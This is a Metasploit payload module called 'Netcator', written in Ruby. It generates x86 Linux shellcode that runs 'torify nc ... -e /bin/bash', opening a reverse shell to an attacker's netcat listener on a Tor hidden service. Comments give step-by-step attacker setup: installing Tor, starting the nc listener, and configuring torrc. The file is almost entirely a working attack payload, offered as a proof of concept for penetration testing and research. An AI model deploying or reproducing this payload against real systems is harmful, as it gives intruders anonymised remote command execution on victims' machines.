##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

###
#
# Netcator
# --------
#
# A simple PoC of a Linux payload that gets connected to a listening netcat via Tor and lets the attacker run commands in the target machine.
#
# Assuming that the victim is already running Tor, to set the environment an attacker would have to:
#
#	1) Install tor in the attacker machine. E. g., in Debian-like systems:
# 		sudo apt-get install tor
#	2) Set up a listening netcat locally in the machine.
# 		nc –v –l -p 1234 127.0.0.1
#	3) Configuring the listening netcat to be reachable via Tor by updating the torrc file:
#		HiddenServiceDir /var/lib/tor/nc_hidden_service/
#		HiddenServicePort 1234 127.0.0.1:1234
#	4) Start the Tor service in the attacker's machine and get the hostname stored in the HiddenServiceDir set before:
# 		service tor start
#	5) Prepare the payload accordingly.
#
# Note that the full scenario will imply the installation/compilation of Tor in the victim. 
# Similar scenarios can be deployed using other services such as SSH or Meterpreter.
# 
# Detailed information can be found at:
# <https://www.elevenpaths.com/es/nuevo-eleven-paths-discover-netcator-shell-inversa-a-traves-de-tor/index.html>
#
###

module Metasploit3

  CachedSize = 43

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Execute Command',
      'Description'   => 'A simple PoC of a Linux payload that gets connected to a listening netcat via Tor and lets the attacker run commands in the target machine. Detailed information can be found at: https://goo.gl/8E7HSj',
      'Author'        => 'Yaiza Rubio (yrubiosec) and Félix Brezo (febrezo)',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86))

    # Register exec options
    register_options(
      [
        OptString.new('HIDDEN_SERVICE',  [ true,  "The .onion domain where the netcat server is listening." ]),
        OptString.new('PORT',  [ true,  "The local port where netcat is listening" ]),
      ], self.class)
  end

  #
  # Dynamically builds the exec payload based on the user's options.
  #
  def generate_stage(opts={})
    cmd     = "torify nc " + datastore['HIDDEN_SERVICE'].to_s + " " + datastore['PORT'].to_s + " -e /bin/bash " || ''
    payload =
      "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68" +
      "\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52" +
      Rex::Arch::X86.call(cmd.length + 1) + cmd + "\x00"     +
      "\x57\x53\x89\xe1\xcd\x80"
  end

end
